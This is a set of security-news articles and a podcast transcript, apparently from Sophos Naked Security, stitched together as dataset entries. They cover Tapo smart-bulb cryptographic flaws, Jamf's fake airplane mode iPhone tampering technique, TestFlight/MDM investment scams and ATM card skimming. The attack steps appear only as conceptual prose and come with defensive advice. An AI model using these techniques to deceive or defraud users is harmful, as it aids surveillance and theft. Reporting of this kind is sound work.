session key is important, because it ensures that no one else on the network can snoop on the Wi-Fi and Tapo passwords when they are subsequently sent from the Tapo app to what it thinks is a Tapo light bulb.\nBut having no verification process for the key agreement itself is a bit like connecting to a website over HTTPS, and then not bothering to perform even the most basic check on the web certificate that it sends back: your traffic will be secure in transit, but could nevertheless be going straight into the hands of a crook.\nThe Tapo app identifies itself to the light bulb (or what it thinks is a light bulb) by sending it an RSA public key, which the other end uses to encrypt a randomly generated AES key to secure the data exchanged during the session.\nBut the light bulb device doesn’t provide any sort of identification, not even a checksum with a hard-wired 32-bit key, back to the Tapo app.\nSo, the app has no choice but to accept the session key without knowing whether it came from a real light bulb or an imposter device.\nThe combined outcome of these two flaws is that an attacker on your network could first convince you that their rogue access point was a genuine light bulb waiting to be configured, and thus lure you to the wrong place, and then convince you to to send it an encrypted copy of your own Wi-Fi and Tapo passwords.\nIronically, those leaked passwords really would be secure against everyone… except the imposter with the rogue access point.\nNumber-used-once that’s used over and over\nUnfortunately, there’s more.\nWhen we said above that\n“those leaked passwords really would be secure,”\nthat wasn’t entirely correct.\nThe session key that’s established during the key agreement process we described earlier isn’t handled correctly, because the programmers made a blunder in their use of AES.\nWhen the app encrypts each request that it sends to a light bulb, it uses an encryption mode called AES-128-CBC.\nWe won’t explain CBC (\ncipher-block chaining\n) here, but we’ll just mention that CBC mode is designed so that if you encrypt the same chunk of data more than once (such as repeated requests to\nturn light on\nand\nturn light off,\nwhere the raw data in the request is the same each time), you don’t get the same output every time.\nIf every\nlight on\nand\nlight off\nrequest came out identically, then once an attacker had guessed what a\nturn it off\npacket looked like, they could not only recognise those packets in future without decrypting them, but also replay those same packets without needing to know how to encrypt them in the first place.\nAs it happens, CBC-based encryption effectively relies on “seeding” the encryption process for each chunk of data by first mixing a unique, randomly-chosen block of data into the encryption process, thus creating a unique sequence of encrypted data in the rest of the chunk.\nThis “seed” data is known in the jargon an IV, short for\ninitialisation vector\n, and although it isn’t meant to be secret, it does need to be unpredictably different every time.\nSimply put: same key + unique IV = unique ciphertext output, but same key + same IV = predictable encryption.\nThe TP-Link coders, unfortunately, generated an IV at the same time that they created their AES session key, and then used the same IV over and over again for every subsequent data packet, even when previous data was repeated exactly.\nThat’s a cryptographic no-no.\nDid I send six packets, or only five?\nThe last cryptographic problem that the researchers found is one that could still harm security even if the initialisation vector problem were fixed, namely that old messages, whether an attacker knows what they mean or not, can be played back later as if they were new.\nTypically, this type of\nreplay attack\nis handled in cryptographic protocols by some sort of sequence number, or timestamp, or both, that’s included in each data packet in order to limit its validity.\nLike the date on a train ticket that will give you away if you try to use it two days in a row, even if the ticket itself never gets cancelled by a ticket machine or punched by a ticket inspector, sequence numbers and timestamps in data packets serve two important purposes.\nFirstly, attackers can’t record traffic today and easily play it back later and potentially create havoc.\nSecondly, buggy code that sends requests repeatedly by mistake, for example due to dropped replies or missing network acknowledgements, can reliably be detected and controlled.\nWhat to do?\nIf you’re a Tapo light bulb user,\nkeep your eyes open for firmware updates from TP-Link that address these issues.\nIf you’re a programmer responsible for securing network traffic and network-based product setups,\nread through\nthe research paper to ensure that you haven’t made any similar mistakes.\nRemember the following rules:\nCryptography isn’t only about secrecy.\nEncryption is just one part of the cryptological “holy trinity” of\nconfidentiality\n(encrypt it),\nauthenticity\n(verify who’s at the other end), and\nintegrity\n(make sure no one tampered with it along the way).\nEnsure any one-time keys or IVs are truly unique.\nThe related cryptographic jargon term\nnonce\n, short for\nnumber used once,\nis a word that clearly reminds you not to re-use data of this sort. (Technically, IVs need to bv truly random, while nonces may follow a pattern such as 000..001, 000..002 and so on, but the critical point is that the IV must be initialised each time you encrypt a new chunk of data, not merely when you initialise the key at the very start.)\nProtect against replay attacks.\nThis is a special aspect of ensuring the\nauthenticity\nand\nintegrity\nwe mentioned above. An attacker should not be able to capture a request you’re making now and blindly replay it later without getting spotted. Remember that an attacker doesn’t need to be able to understand a message if they can replay it and potentially create havoc.\nShare this:\nMastodon\nBluesky\nReddit\nLinkedIn\nMore\nTumblr\nPocket\nPrint\nEmail",

        "content": "Researchers at Apple device management company Jamf recently published an intriguing paper entitled\nFake Airplane Mode: A mobile tampering technique to maintain connectivity\n.\nWe’ll start with the good news: the tricks that Jamf discovered can’t magically be triggered remotely, for example merely by enticing you to a booby-trapped website.\nAttackers need to implant rogue software onto your iPhone first in order to pull off a “fake airplane” attack.\nThe bad news, however, is that the software shenanigans used aren’t the typical tricks associated with malware or date exfiltration code.\nThat’s because “fake airplane” mode doesn’t itelf snoop on or try to steal private data belonging to other apps, but works simply by showing you what you hope to see, namely visual clues that imply that your device is offline even when it isn’t.\nGiven that even the App Store, Apple’s own compulsory walled garden for software downloads, isn’t immune to malware and potentially unwanted applications…\n…you can imagine that determined scammers, cryptoconfidence tricksters and spyware peddlers might be keen to find a way to hide “fake airplane” treachery in otherwise unexceptionable looking apps in order to make it through the App Store verification process.\n24/7 threat hunting, detection, and response delivered by an expert team as a fully-managed service.\nLearn More\nWhat you see is not necessarily what you get\nAs the Jamf researchers explain it, most users who are concerned not only about going offline temporarily, but also with checking that they really are disconnected from the internet, do something like this:\nSwipe up from the home screen to access the\nControl Center\n.\nTapping on the aircraft icon typically turns the aircraft orange and all three radio communication icons (mobile, wireless and Bluetooth) grey:\nTry to browse to a popular site.\nOpening or refreshing a web page when airplane mode is successfully engaged typically produces a notification that explicitly says\nTurn off Airplane Mode or use Wi-Fi to Access Data\n:\nAt this point, a well-informed user would be inclined to accept not only that they had turned airplane mode on, but also that they had successfully cut the apps on their phone off from the internet.\nUnfortunately, Jamf coders found a series of sneaky tricks by which they could separate appearance from reality.\nFirstly\n, they figured out how to intercept the API (application programming interface) call triggered by tapping on the aircraft icon on the Control Center screen.\nIn this way, the apparent switch to airplane mode was recorded in the iPhone logs, yet the actual system call to turn it off in real life was hijacked to turn off Wi-Fi but not the mobile network, leaving an unexpected pathway off the phone for any app authorised to use mobile data.\nSecondly\n, they reconfigured your browser (they used Safari in their tests, but we assume other apps, including alternative browsers, could be tricked in the same way) so that the app alone, rather than the entire device, was blocked from using mobile data connections.\nIn theory, the roguery of cutting off a specific app from the internet instead of the whole phone ought to be obvious, because a well-informed user would see a completely different warning when trying to browse to a known page:\nThis notification clearly implies that mobile data is turned on in general, but disabled specifically for Safari, in contrast to the warning shown above, where airplane mode is mentioned explicitly.\nSo,\nthirdly\n, the researchers figured out how to intercept the “mobile data is turned off” dialog, and simply to replace it with the more reassuring “airplane mode is on” notification instead.\nThe last possible giveaway facing the Jamf researchers was that with airplane mode artificially activated in the Control Center screen (thus correctly turning the aircraft icon orange), the mobile data connection icon (the broadcasting lollipop) would nevertheless remain green.\nFourthly\n, therefore, the researchers found a way to dim the mobile data icon to give the false impression that the option was disabled, and thus by implication turned off, even though it wasn’t.\nWhat to do?\nThe good news is that the researchers only figured out how to misrepresent the state of your device’s connectivity when changes were made via the Control Centre swipe-up screen.\nIf you go directly to the\nSettings\npage, the tricks outline here are no longer enough, because the Airplane Mode setting, along with the resulting configuration forced on your Wi-Fi, Bluetooth and Mobile Data settings, can be correctly controlled and reliably checked:\nWe’re assuming, with enough effort and with sufficiently powerful malware already installed on your iPhone, that a determined attacker might be able to interfere even with the Settings page, but the Jamf team didn’t come up with a practicable way of doing this in their research.\nSo, if you ever need to use apps on your phone while being as certain as you can that it’s cut off from the internet, remember that a simple connection test with your browser might not be telling you the truth.\nCheck directly on the\nSettings\npage, rather than indirectly via\nControl Center\nor your browser.\nShare

he is Paul Ducklin.\nPaul, how do you do today, Sir?\nDUCK.\nVery well, Douglas!\nDOUG.\nExcellent.\nThis week: 14 August 1982 was officially designated as\nNational Navajo Code Talkers Day\n.\nA proclamation by then President Ronald Reagan reads in part:\nIn the midst of the fighting in the Pacific during World War II, a gallant group of men from the Navajo Nation utilised their language in coded form to help speed the Allied victory.\nThe Code Talkers confused the enemy with an earful of sounds never before heard by code experts.\nSo, Paul, let us now discuss what this has to do with technology.\nDUCK.\nAs regular podcast listeners will know, because we’ve talked about things like the Enigma machine, which was used in the European theatre of war, and the Lorenz cipher machine, which was used for Hitler’s own communications with his general staff… we’ve talked about cracking those automated cipher machines.\nThe Americans had similar successes against some of the Japanese cipher machines, like PURPLE, which was an electromechanical cipher based on rotary telephone switches.\nBut given that the fighting in the Pacific was largely hand-to-hand stuff on small, jungly islands, a terrifying sort of warfare…\n…even if they’d had the equivalent of the Enigma machine in portability, there just wasn’t the time and the space to use it.\nAnd so it was decided that perhaps a Native American language could be used essentially as a cleartext code, because those languages had not been widely studied by anybody in Europe or Japan.\nAnd therefore by speaking rapidly but clearly, and using predetermined code words for things that didn’t exist in the Navajo language yet (because in all their extensive linguistic history, they’d never had the need for terms of modern warfare), perhaps they could communicate in what was cleartext to the speakers, but yet would be impenetrable to those who were intercepting the transmissions.\nAnd so it was!\nThe really, terribly brave thing about all of this is that these chaps weren’t just cipher machine operators, Doug.\nThey were US Marines; they were part of the elite fighting corps.\nSo they had to do the US Marines training [LAUGHS] (I shouldn’t laugh) and be right there, in the heat of combat, in dreadful conditions, and yet, at a moment’s notice, be able to get their heads down under pressure and talk clearly and intelligibly (and yet undecipherably to the enemy).\nApparently, a senior Japanese officer, after the war, admitted that although they had made considerable progress cracking some of the US Air Force ciphers, they had literally made no progress at all against trying to understand what these Navajo code talkers were saying.\nDOUG.\nVery cool story.\nAlright, we’ve got some also plain and straightforward language from the Federal Bureau of Investigation.\nThis is a warning about mobile beta-testing apps.\nWe’ve spoken about these at length before, these so called TestFlight-style scams.\nThey’re not going away, Paul.\nhttps://nakedsecurity.sophos.com/2023/08/16/fbi-warns-about-scams-that-lure-you-in-as-a-mobile-beta-tester/\nDUCK.\nNo.\nNow, the FBI has dutifully not mentioned specific platforms and technologies.\nI guess it has to watch its words because it doesn’t want to suggest that any specific vendor is more to blame than any other, and it doesn’t want to imply that, “Oh, well, if you’re using a Google device and not an Apple device, you don’t have to worry about any of this stuff.”\nAnd, indeed, the advice they’ve put at the end of their public service announcement, which is entitled\nCybercriminals targeting victims through mobile beta-testing applications\n, is a general set of advice that you should use so you don’t get sucked into running dodgy apps, no matter where they came from.\nBut you’re right that, particularly for iPhone users, there may be a sense almost of smugness in some people’s security outlook, because they know that they can only get apps from the App Store.\nAnd as much as they might sometimes feel jealous of their Android-using chums who can go off-market and download whatever they want, at least they think, “Well, I’m not going to download a totally rogue application by mistake.”\nAnd yet, as we’ve discussed on nakedsecurity.sophos.com and on news.sophos.com many times, there are two really nasty tricks that crooks can use if you have an iPhone.\nOne is that they can pretend that you’re getting in during the early days of some brand new company that’s starting up.\nAnd so the crooks encourage you to sign up your phone into their corporate Mobile Device Management [MDM] program, which is normally reserved for giving an IT department very intimate control over phones that it owns, or pays for, and hands out to staff.\nThe other way is to say to the person, “You know what, this is a brand new app. Not many people have got this. So you have to sign up for this special beta program.”\nApple does this by getting you to download a special app called TestFlight; then you can download apps that don’t go through exactly the same checking as apps that exist in the App Store.\nAnd, of course, because it’s a beta program, the app has not been released yet.\nSo all of the evidence that you might look for, all of the collateral information that might tell you whether this was a good or bad app, is missing, and you’re relying entirely on the person telling you, “Yes, you can trust us. Let us enroll your phone into our ‘special company’ (I’m using giant air-quotes) or join our ‘special beta program’ by invitation only.”\nDOUG.\nYes, I believe that TestFlight limits the number of testers to 10,000, so that the crooks need to be much more targeted.\nWhen we talked about these in the past, they were under the guise of romance scams, where you would start maybe on a dating site, and if I’m targeting someone, I might not actually try to get romantically involved with them, but say, “Let’s be friends? What do you do? I have this company that’s starting this new crypto thing that’s really going to be a hit, and I’ll let you into this little exclusive club.”\nSo these kind of things start as a “slow burn” under the guise of friendship and “you can trust me”… and then I’m going to tell you to do all this stuff to your phone.\nDUCK.\nIn this case, as you say, it’s sort-of like a romance, but of a different sort: “Would you love to make loads of money?”\nSo, as you say, it is that longer burn.\nAnd in some of these scams that our colleagues Jagadish Chandraiah and Sean Gallagher have written up on news.sophos.com (they’ve got the name\nchopping-block scams\nor\npig butchering scams\n, because that’s the rather ugly name by which they’re known in Chinese, because they’re very widespread, apparently, in South-East Asia)… that’s the way they unfold.\nSomeone will get befriended; they will get loads of calls; they’ll get loads of messages; they’ll get apparently personalised contact.\nThey will really have a friend and a confidant who will encourage them to install an app in one of these strange ways.\nNobody else can download it… the only people who ever get the app are people who are pre-selected to join this club by the scammers who have their worst interests at heart.\nDOUG.\nAll right, so from our research, some of these, the financial scams especially: it’s a nice slick looking app where you put some money in, and it looks like your money’s going up, and then you withdraw some… they do let you withdraw some; they basically give some of your own money back?\nDUCK.\nYes, because obviously, if they were true scammers, they wouldn’t let you withdraw a single penny piece, would they?\nDOUG.\nExactly.\nDUCK.\nBut as you say, all they’re doing is giving you a little bit of your own money back.\nDOUG.\nAnd now, “Look, you pulled this money out, but look how fast it’s going up! You should have put more in! You should have kept it in!”\nThen they come after you with a tax bill that, “Oh, you’ve got to pay taxes on this.”\nDUCK.\nAbsolutely.\nAnd that “withholding tax” scam at the end… I’ve heard people say, “Who would ever fall for that?”\nBut the point is, you went in here with what you thought were your eyes wide open, because you’d “met” this person; you’d apparently befriended them; it wasn’t like you went looking for a cryptocurrency investment.\nYou found a person on a dating site, “Oh, well, we’re only going to be chums. We’re not interested in any romantic engagement.”\nSo at the end, the story is, “OK, it’s a good time to cash out. If you want the money, you can get it out, but unfortunately the government has frozen the account and you have to pay them the tax up front, and only then can you withdraw the whole amount.”\n“We can’t release the money and do what’s called a withholding tax (which is where you just take the tax owed out of the money that you’ve already got) because the account’s frozen.”\n“I’ve got to warn you, that’s a bad sign – they could be coming after you, so you need to get out now. Send us the extra money; go and borrow it from your buddies; ask your mum; ask your auntie; ask your brother, just get the money together!”\nAnd of course, you’re just throwing bad money after good, so don’t do that!\nDOUG.\nAlright, we’ve got some other tips in the post, so check that out on nakedsecurity.sophos.com.\nLet’s move on to ATM card skimming.\nThis is still a thing, and has been for so long, that I, for years now, Paul, have been tugging on the credit card slots at every gas station and ATM I visit!\nhttps://nakedsecurity.sophos.com/2023/08/15/grab-hold-and-give-it-a-wiggle-atm-card-skimming-is-still-a-thing/\nDUCK.\nYes, we haven’t written about it for quite a long time on Naked Security, because news about so-called ATM skimming has decreased.\nObviously, we live in a tap-to-pay and a chip-and-PIN world, at least outside the United States.\nSo we’re used to the idea that you rarely, or never if you’re in Europe or in the UK, swipe your card.\nBut ATMs always take your card right in, don’t they?\nYou put it in a slot and it sucks your card right in.\nFor the crooks, that means they get a chance, with extra added hardware, to read the magstripe.\nAnd the other problem with an ATM, even if it’s inside a bank itself, or in the little ATM lobby at the entranceway to a bank or a banking court… there are loads of places on an ATM, surfaces and weird angles and sticky-out bits, where a crook can attach some kind of monitoring device such as a camera without it being really obvious.\nDOUG.\nYes, this photo you have in the article is wild.\nThere’s just a little tiny pinhole right in the card mechanism that’s ostensibly shooting down onto the keypad.\nJust really tiny.\nYou’d really have to be looking for it.\nDUCK.\nThe story that we wrote up this week came from the Queensland Police in Australia.\nThat picture is from a Queensland Police anti-skimming advisory from just over ten years ago.\nAnd you can imagine how the technology has come on since then: cameras are smaller; it’s easy to buy off-the-shelf system-on-chip embedded computer motherboards that do more than what you need for PIN skimming.\nSo the idea of these ATM skimming crooks is they’re not just interested in your card details, like a web phisher would be.\nThey’re interested in getting the PIN that unlocks your card.\nAnd remember: that PIN, whether you have an old-style card with a magstripe or a card with a secure chip… the PIN is never stored on the card.\nThat’s the whole idea of it.\nIt’s not even printed on the card, like the security code on the back.\nAnd that’s the advantage, if you like, of ATMs to skimming crooks.\nUnlike devices in the coffee shop where most of the time you don’t type in your PIN (you just tap your card), ATMs always make you put in your PIN.\nIt’s the first thing you do to unlock the menus, and then you decide what you want to do next.\nAnd, as you say, there are all these places where cameras can hide.\nIf you look at the video that the Queensland police put up of this bust, there’s a great foot-chase where the crooks are desperately trying to run.\nBut I must say [LAUGHS] that Queensland copper was a lot fitter!\nDOUG.\n[LAUGHS] Yes, he had a good lead on the cop, and I was, like, “Oh, he’s going to get away!”\nThen it’s was, “Oh, no, he’s not going to get away!” [LAUGHS]\nDUCK.\nSo, it’s a great story because it also shows how the whole investigative process worked.\nThey knew that there was skimming going on, so they knew sort-of what to look out for.\nThey were able to raise the alarm with the financial institutions, who looked out for the devices; one of them found one.\nPresumably, I imagine that the bank would have taken it out of service, saying, “Oh, there’s a fault with the machine.”\nSo the crooks know, “Uh oh! If someone comes to service the ATM, they’re going to notice the skimmer, so we’d better go and recover it,” not knowing that the cops are watching.\nThat then led to a warrant to visit an address and arrest a third person.\nAnd in a nice closure, it seems that, because they had the warrant and they searched the property, the cops are alleging that they also found a fake ID card that just happened to be in the name of the nonexistent person to whom the original skimming devices that triggered the investigation had been addressed.\nSo there’s a nice thing that shows you how the cops go about dotting their I’s and crossing their T’s in investigations of this sort.\nAnd also how co-operation between the police and the financial institutions can actually help to stamp this thing out.\nAs you say, “Grab hold and give it a wiggle.”\nIf it doesn’t look right, don’t use the ATM.\nAnd the fact that it’s inside a bank branch, or inside an ATM lobby, doesn’t help.\nIn the article, I recount a story where the crooks decided they wanted to film PINs of ATMs that were in the bank.\nThey knew they couldn’t stick the camera to the ATM, because they knew it got rigorously inspected by the staff every morning.\nSo they put the camera, Doug, in a brochure holder next to the ATM… and the bank hadn’t thought of that!\nEvery morning, the staff would go out and make sure that it was properly full of brochures, for extra disguise.\nSo, be aware of your surroundings, whenever you use an ATM.\nThe fact that you’re using one in a well-lit, apparently secure banking lobby… you may do that for your personal security, but you still need to shield your PIN code really well while you’re typing in your PIN, just in case.\nIt’s not stored on the card, so a camera is one of the few ways that the crooks can get at it.\nDOUG.\nAlright, great advice.\nLet’s stick with the crime motif here.\nA bulletproof host, which was used for ransomware attacks (bad ones, too – the NetWalker ransomware, which went after hospitals during COVID-19) has been shut down.\nIt turned out not to be so bulletproof after all.\nhttps://nakedsecurity.sophos.com/2023/08/14/crimeware-server-used-by-netwalker-ransomware-seized-and-shut-down/\nDUCK.\nIndeed:\nlolekhosted.net\n.\nYou can still visit the site, so the site’s still online, but you will get a “This domain has been seized” notice, courtesy of the United States Federal Bureau of Investigation.\nThe wanted party is a Polish national, but as the FBI wryly had to say in its own report,\n“Grabowski remains a fugitive.”\nSo they haven’t got him yet.\nAnd he was actually able to run this site apparently for many years before they got the right to take it down.\nSo as much as this seems like a case of “too little too late”…\n(A) I think we should praise what the FBI and others have been able to do, even though it may not seem like very much.\n(B) I bet you there are loads of people who used that service, maybe for some minor cybercrimes, who are now quaking in their boots, wondering whether their information was among the stuff seized as part of the whole investigation.\nAnd (C), it’s a chance for the FBI to put up a big reminder about how even apparently little things, like the hosting services that assist in cybercrimes, can make a lot of money and do a lot of harm.\nThey particularly wanted to tie this one to the NetWalker ransomware gang.\nDOUG.\nSo how do you bulletproof a host?\nDUCK.\nWell, the FBI actually have a nice summary of what “bulletproof hosts” promise their customers, by writing up what this particular suspect is alleged to have done.\nI’ll just read this out, because it’s very useful:\nGrabowski allegedly facilitated the criminal activities of his clients by allowing them to register accounts using false information, not maintaining IP address logs of client servers, frequently changing the IP address of client servers (that keeps you off blocklists), and ignoring abuse complaints made by third parties.\nOh, and he also notified people when he thought the cops were after them.\nSo he provided a sort of “tattletale service”, which legally he is not supposed to be doing.\nClearly, as you said right at the outset, this service was not as bulletproof as its perpetrator might have thought, and as its clients might have believed.\nSo it really does remain for you to say, Doug….\nDOUG.\nWe’ll keep an eye on this!\nDUCK.\nIt may not be obvious what comes next, because the FBI doesn’t have to say exactly which bits of intelligence it got from what busts, but it very frequently does.\nSo it will indeed be interesting to watch what happens next.\nDOUG.\nAlright, we have a comment from someone going by H, who says:\nI think that if it takes 10 years and who knows how many man-hours to catch just one of these guys, then the crooks have a better business model than any of the high-tech companies.\nWhich I think is probably a sentiment shared by a lot of people.\nThere’s a lot of work that goes into these busts, and the guy’s still on the run.\nBut fact of the matter is, this is cutting the head off of a Hydra, and these guys are acting illegally.\nThat’s why it’s such a good “business model”.\nThey’re not playing by any rules!\nDUCK.\nYes.\nIt’s not that they have a *better* business model, it’s that they have an *illegal* one, and their whole goal is to make money illegally.\nI presume that’s intended as a little bit of a dig at the cops, isn’t it?\n“Oh, it took you so long.”\nBut as we mentioned in that story from the Queensland Police about the skimming bust, which I urge you to go and read, because it’s short, it’s easily absorbed, but it shows you how many wheels within wheels there are…\n…even in an apparently simple investigation, it’s not just a question of, “Oh, we found the skimmer, let’s rip it off, and the job’s done.”\nDOUG.\nEvery little bit helps!\nAlright, thank you, H.\nIf you have an interesting story, comment or question you’d like to submit, we’d love to read it on the podcast.\nYou can email tips@sophos.com, you can comment on any one of our articles, or you can hit us up on social: @nakedsecurity.\nThat’s our show for today; thanks very much for listening.\nFor Paul Ducklin, I’m Doug Aamoth, reminding you until next time

        "content": "The US Federal Bureau of Investigation (FBI) has just published an official public service announcement headlined with with a very specific warning:\nCybercriminals Targeting Victims through Mobile Beta-Testing Applications\n.\nThe Feds didn’t go as far as naming any specific vendors or services here, but one of the main reasons that crooks go down the “beta-testing” route is to lure users of Apple iPhones into installing software that didn’t come from the App Store.\n(We’re guessing that explicitly naming Apple would not only be a bit unfair, but might also give a false sense of security to anyone who doesn’t have an Apple-branded phone, because the general lessons to be learned here apply to all types of mobile phone, and even, by extension, to all sorts of software on all sorts of device.)\n24/7 threat hunting, detection, and response delivered by an expert team as a fully-managed service.\nLearn More\nUsing rarity and privilege as a lure\nSome iPhone users feel secure against malware, spyware, rogueware and scamware simply because Apple insists that iPhone (and iPad apps, for that matter) must be acquired from the App Store.\nAndroid users start out in a similar world, with installs allowed by default only from Google Play, but they have the option to go “off-market” if they want, and fetch apps from unofficial sources.\nIn contrast, even iPhone apps that are 100% free must be submitted by the vendor to the App Store to become available for download, and downloaded by the user from the App Store for installation.\nBut there are at least two ways to get what amount to unofficial apps, or at least “unendorsed by Apple apps”, onto an iPhone.\nOne is to use Apple’s\nMobile Device Management\n(MDM) system, which is officially intended for companies that want to deploy proprietary, non-public, corporate apps onto company-supplied or company-managed devices.\nAnother is to sign up for Apple’s\nTestFlight\nservice, which lets you offer pre-release software for trial by a maximum of 10,000 users as part of your\nbeta-testing program\n.\nAlpha software, after the first Greek letter, is an old-school jargon name for code that is still in its first stages of development: typically very rough and ready, more of a proof-of-concept than a real app.\nBeta software, after the second Greek letter, usually refers to a software product that’s past that first stage, but is not yet fully debugged, isn’t yet recommended for everyday use, and is therefore available only in a limited release.\nConvincing victims to “join the club”\nAs it happens, both MDM enrollment and beta-test signup require active agreement from the owner of the device.\nThat’s because enrolling your device into MDM gives lots of control to your corporate IT team, such as giving them the right to wipe your phone if they want.\n(Phones under MDM can be wiped remotely without your consent on the grounds that if your phone were stolen, a consent request from IT would play into the hands of the thief, who would simply say, “No” to the request, and would also be alerted that the theft had been reported.)\nSimilarly, beta-level software exposes you to greater risk, not only because it’s expected still to contain plenty of bugs, but also because beta software is generally expected to collect much more information than a finished app, as part of tracking down any faulty behaviour.\nThat, of course, raises the questions,\n“Why would anyone willingly agree to submit to MDM by someone who wasn’t their employer and had no reason to be able to manage their device remotely, or to install beta-quality software if they weren’t knowingly part of the development process?”\nThe answer, in the case of the cybercrime that the FBI are warning about here, is that these MDM/Beta scammers aren’t aiming to sign up everyone, or even just anyone.\nMost of them have take a leaf out of the\nromance scammers’ playbooks\n, where their goal is not to lure in 1,000,000 potential victims, sign up 1% of them, and hit each of them up abrpuptly for $10 or $100 each.\nhttps://nakedsecurity.sophos.com/2021/10/13/romance-scams-with-a-cryptocurrency-twist-new-research-from-sophoslabs/\nThese scammers aim to identify 100s or 1000s of potential victims, actively befriend 10s or 100s of them, and then lure them, under the guise of being trusted friends, into parting with $10,000 or more each, often engaging with them regularly and personally over an extended period of time\nIndeed, a lot ot these MDM/Beta scammers start in just the same way as romance scammers: by “meeting” victims on online dating sites using fake profiles, and by building up a friendship and an apparent sense of mutual trust.\nThen, instead of drawing their victims into a relationship based on love and emotional affection, they initiate a relationship based more directly on money, usually based on the lure of a cryptocurrency “investment” that isn’t open to just anyone.\nAt this point, the crooks have already created a believable reason why the app you need to download and install isn’t in the App Store, where everyone would be able to see it.\nIts suspicious deployment method, via MDM or TestFlight, is re-explained by the criminals as a sign that it’s something special; an opportunity that’s a privilege to participate in.\nMoney goes in but “earnings” never come out\nYou’re probably familiar with how this sort of scam plays out: the app shows data from a legitimate-looking but utterly bogus backend system.\nThe bogus investments always seem to keep on going up; trading volumes always look healthy; and (in at least some of these scams) you can even make withdrawals, assuming that you want to test that it isn’t just a one-way system.\nAs you can imagine, any withdrawals you’re allowed as a “test” of an scam site’s legitimacy will be kept well within the amount you’ve already put in (so you’re really only getting a bit of your own money back), or won’t actually be paid out for real (they’ll be converted into “reinvestments” with appealing but fake “rewards” and “bonuses” to keep you on the hook).\nThe doubly bitter end, for many victims, comes when they decide to cash out forever, and the scammers realise they can’t keep the victim inside the fraud pyramid any longer.\nMany of these scammers then turn threatening as well as dishonest, telling you that the government has frozen your account; that you owe some sort of tax on your capital gains; and that because the account is frozen, you can’t just have the tax amount witheld from your withdrawal.\nYou have to make good the tax payment first, typically at the rate of 20%, to get out of trouble with the law.\nOnly then will you get your “investment” out, and because the “government” is involved, there’s a time limit that can’t be argued with.\n“Borrow from your family and friends,” the scammers may say, becoming ever-more menacing about how badly things will turn out if you don’t pay the “government” its share in the time allowed.\nAt this point, of course, the 20% “tax” is being calculated not merely on the money you actually put in so far, but on the fake “investment growth”, plus the made-up “rewards” and “bonuses” that you have “accrued” along the way.\nSome desperate victims may end up paying in as much again at the end as they did along the way.\nWhether victims decide to pay in that final 20% or not, one thing is certain: nothing ever comes back from the crooks.\nEverything paid in vanishes forever.\nWhat to do?\nAs SophosLabs researcher Jagadeesh Chandraiah has warned in a\ndetailed report\nthat he published last year:\n[These] scams continue to flourish through the combination of social engineering, cryptocurrency, and fake applications. These scams are well-organised, and skilled in identifying and exploiting vulnerable users based on their situation, interests, and level of technical ability. Those who get pulled into the scam have lost tens of thousands of dollars.\nCryptoRom Bitcoin swindlers continue to target vulnerable iPhone and Android users\nTo stay clear of online scammers who lure you into trusting relationships with the express purpose of defrauding you, typically over weeks or months, here are our Top Tips:\nTake your time when online talk in a developing friendship turns to money.\nDon’t be swayed by the fact that your new “friend” happens to have a lot in common with you. That needn’t be down to serendipity or because you have found a genuine chum. The other person could simply have read your own online profiles carefully in advance.\nNever give administrative control over your phone to someone with no genuine reason to have it.\nNever click\n[Trust]\non a dialog that asks you to enrol in remote management unless it’s from your employer, and your employer looks after or owns your device.\nDon’t be fooled by circumstances that imply approval from Apple.\nThe fact that an app is registered for beta testing with TestFlight doesn’t mean it’s officially vetted and approved by Apple. In fact, it’s the opposite: TestFlight apps aren’t in the App Store yet, because they’re still being developed and could contain bugs, accidentally or deliberately. If anything, you need to trust the developers of a TestFlight app even more than vendors of regular apps, because you’re letting them run experimental code on your device.\nDon’t be deceived by messaging inside the app itself.\nDon’t let icons, names and text messages inside an app trick you into assuming it has the credibility it claims. Don’t believe investment results simply because the app shows you what you want to see.

        "content": "It’s been a while since we’ve written about card skimmers, which used to play a big part in global cybercrime.\nThese days, many if not most cyber-breach and cybercrime stories revolve around ransomware, the darkweb and the cloud, or some unholy combination of the three.\nIn ransomware attacks, the criminals don’t actually need to approach the scene of the crime in person, and their payoffs are extracted online, typically using pseudoanonymous technologies such as the darkweb and cryptocoins.\nAnd in some cloud-based cybercrimes, notably those generally referred to as\nsupply-chain attacks\n, the criminals don’t even need to access your network at all.\nIf they can find a third party to whom you regularly upload precious data, or from whom you routinely download trusted software, then they can go after that third party instead, and do the damage there.\nIn recent cyberextortion attacks, dozens of major brand names have been blackmailed over stolen employee and customer data, even though that data was stolen indirectly.\nIn the\nMOVEit attacks\n, for instance, the data was stolen from service providers such as payroll processing companies, who had used buggy file transfer software to accept supposedly-secure uploads from their own customers.\nUnbeknownst to both the companies that ultimately got blackmailed and to the payroll processing services they used, the MOVEIt file transfer software allowed crooks to perform unauthorised downloads of stored data as well.\nhttps://nakedsecurity.sophos.com/2023/06/05/moveit-zero-day-exploit-used-by-data-breach-gangs-the-how-the-why-and-what-to-do/\n24/7 threat hunting, detection, and response delivered by an expert team as a fully-managed service.\nLearn More\nIn-your-face cybercrime\nCredit card skimming, in contrast, is a much more in-your-face crime, both for its perpetrators and their victims.\nCard skimmers aim at leeching the private information that’s critical to your bank card, at the very moment that you use the card.\nNotoriously, card skimmers don’t just go after data stored on the card itself but also after the PIN that serves as your second factor of authentication.\nWhether your card has an easily-cloned magnetic strip, or a secure chip that’s can’t be cloned, or both, your PIN is never stored on or in the actual card.\nSkimming criminals therefore typically use miniature hidden cameras to snoop out your PIN live as you type it in.\nIronically, perhaps, bank cash machines, better known as ATMs, make a perfect location for card skimming equipment.\nATMs almost always grab onto your card mechanically and draw it right into the machine, out of sight and reach.\n(Apparently, that’s for two main reasons: firstly because that process tends to slice off any rogue wires soldered onto the card that might connect it to the outside world while it’s in use, and secondly because it allows the bank to confiscate the card if it thinks that it might have been stolen.)\nIn other words, adding a fake magstripe reader to an ATM is generally more effective than doing the same thing on any tap-to-pay or chip-and-PIN terminal, where the full magstripe never passes into or over the reader.\nAlso, ATMs always ask for your PIN, and often have plenty of convenient surface features where a tiny camera can be hidden in plain sight.\nWhen security precautions have the opposite effect\nIn another irony, well-lit bank lobbies that aim to provide reassuring surroundings are sometimes a better place for card skimmers than dimly-lit ATMs on side-streets.\nIn one case that we recall, the ATM lobby in an downtown building that served mulitple banks had been fitted with an after-hours “security” door to make customers feel safer.\nThe door was meant to prevent just anyone from hanging out amongst the ATMs all night long, because would-be ATM users had to swipe a bank card of some sort at the entrance to get initial access.\nRather than improving security, however, this made matters worse, because the crooks simply fitted a hidden card reader to the door itself, thus leeching the data from cards of all banks 